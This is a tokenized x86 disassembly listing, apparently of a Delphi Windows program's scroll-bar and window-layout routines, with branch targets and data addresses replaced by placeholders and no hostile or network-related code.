call sub_455c0c
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4412ec
call sub_455470
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4412ec
call sub_455404
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_455584
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_4445f8
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4555bc
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4445f8
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_4555f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4555bc
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4555bc
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_45566c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4445f8
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_4555f0
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43d7fc
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_4555f0
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43d840
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_455704
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4445f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_455764
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_455935 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45566c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45566c
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
push ebp
call sub_455704
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
push ebp
call sub_455704
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406a98
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455ad4
jmp r-xdata
sub_455a5c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45614c
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_455ad4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_4445f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_4445f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_4441b0
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_4441b0
jmp r-xdata
call sub_455244
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_455b98
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45614c
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_455c50
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4445f8
push eax
call sub_4262d0
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4445f8
push eax
call sub_4262d0
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4445f8
push eax
call sub_4262d0
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41cf40
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4445f8
push eax
call sub_4262d0
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4445f8
push eax
call sub_4262d0
sub_455d58
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45566c
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45566c
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_455c50
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4445f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_455ad4
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_45566c
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_455e70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440324
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4552ec
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4552ec
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_455ee8
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4032a0
mov eax [ esi + 0x20c ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440448
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_455f34
push ebx
mov ebx eax
mov eax ebx
call sub_4415b0
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_45614c
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40be6c
test al al
jne r-xdata
mov eax ebx
call sub_4445f8
push eax
call sub_426304
sub_455f74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4560cc
mov ecx edi
mov edx esi
mov eax ebx
call sub_440cf8
pop edi
pop esi
pop ebx
retn
sub_455fb4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4560bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43d7fc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_455584
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_441328
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_455ad4
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_413c88
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43d568
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4560c3
mov eax [ ebp - 0x10 ]
call sub_4032a0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4553cc
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_413de4
xor ecx ecx
mov edx 0xb03e
call sub_43efc4
inc ebx
dec esi
jne r-xdata
sub_4560f0
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_455c24
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_455c24
mov eax ebx
call sub_4560cc
jmp r-xdata
sub_45614c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4448fc
test al al
je r-xdata
xor eax eax
push ebp
push sub_456237
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_4556ec
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4556ec
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_455d58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_455d58
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_455d58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_455d58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_455d58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_455d58
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45625c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43d910
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43d93c
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43d910
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43d93c
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43d7fc
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_455ad4
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43d7fc
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_43d840
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_455ad4
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_43d7fc
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_455ad4
mov eax ebx
call sub_43d7fc
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_43d840
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_43d840
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_455ad4
mov eax ebx
call sub_43d840
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_4563b0
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_455ad4
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_455ad4
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_4061f4
mov edx eax
mov eax ebp
call sub_455c24
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_4061f4
mov edx eax
mov eax ebp
call sub_455c24
sub_456454
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4563b0
mov ecx edi
mov edx esi
mov eax ebx
call sub_444104
pop edi
pop esi
pop ebx
retn
sub_45647c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_4564e6
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442be4
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4564ed
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_4564ed
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_456525
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4560cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45652c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45652c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45614c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_4565a0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43d840
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4243fc
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_43d7fc
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4243fc
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_4129d8
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_440664
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_456610
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456671
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40342c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_443974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456678
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_4566a0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456804
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
